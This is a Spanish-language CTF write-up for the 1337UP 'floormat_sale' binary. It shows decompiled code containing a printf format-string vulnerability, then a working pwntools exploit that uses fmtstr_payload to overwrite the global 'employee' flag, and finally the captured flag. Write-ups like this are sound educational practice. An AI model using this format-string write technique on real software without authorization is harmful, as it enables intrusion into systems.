---
date: 
tier: medium
author: naibu3
ctf: 1337UP
---
# Overview

```
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

# Reconocimiento

```c
undefined8 main(void)

{
  int iVar1;
  int input;
  char address_input [256];
  char *options [4];
  char *option5;
  char *option6;
  __gid_t user_gid;
  int i;
  
  setvbuf(stdout,(char *)0x0,2,0);
  options[0] = "1. Cozy Carpet Mat - $10";
  options[1] = "2. Wooden Plank Mat - $15";
  options[2] = "3. Fuzzy Shag Mat - $20";
  options[3] = "4. Rubberized Mat - $12";
  option5 = "5. Luxury Velvet Mat - $25";
  option6 = "6. Exclusive Employee-only Mat - $9999";
  user_gid = getegid();
  setresgid(user_gid,user_gid,user_gid);
  puts(
      "Welcome to the Floor Mat Mega Sale!\n\nPlease choose from our currently available floor mats: \n"
      );
  puts("Please select a floor mat:\n");
  for (i = 0; i < 6; i = i + 1) {
    puts(options[i]);
  }
  puts("\nEnter your choice:");
  __isoc99_scanf(&DAT_00402225,&input);
  if ((0 < input) && (input < 7)) {
    do {
      iVar1 = getchar();
    } while (iVar1 != 10);
    puts("\nPlease enter your shipping address:");
    fgets(address_input,256,stdin);
    puts("\nYour floor mat will be shipped to:\n");
                    /* FORMAT STRING VULN */
    printf(address_input);
    if (input == 6) {
      employee_access();
    }
    return 0;
  }
  puts("Invalid choice!\n");
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

```c
void employee_access(void)

{
  char local_58 [72];
  FILE *local_10;
  
  if (employee == 0) {
    puts("\nAccess Denied: You are not an employee!");
  }
  else {
    local_10 = fopen("flag.txt","r");
    if (local_10 == (FILE *)0x0) {
      puts(
          "Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are runnin g this on the shell server."
          );
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    fgets(local_58,0x40,local_10);
    printf("Exclusive Employee-only Mat will be delivered to: %s\n",local_58);
    fclose(local_10);
  }
  return;
}
```

# Explotación

```
readelf -s floormat_sale | grep employee
    18: 00000000004011c6   159 FUNC    GLOBAL DEFAULT   14 employee_access
    30: 000000000040408c     4 OBJECT  GLOBAL DEFAULT   25 employee
```

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

exe = context.binary = ELF(args.EXE or 'floormat_sale')

def start():

    if args.REMOTE:
        return remote("floormatsale.ctf.intigriti.io", 1339)
    else:
        return process('./floormat_sale')

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# Stripped:   No

# Dirección de employee
employee = 0x40408c
offset=10

io = start()

io.recvuntil("choice:")
io.sendline("6")
io.recvuntil("address:")

payload = fmtstr_payload(offset, {employee:  0x1})

io.sendline(payload)

io.interactive()
```

```
Your floor mat will be shipped to:

c\x8c@@Exclusive Employee-only Mat will be delivered to: INTIGRITI{3v3ry_fl00rm47_mu57_60!!}
```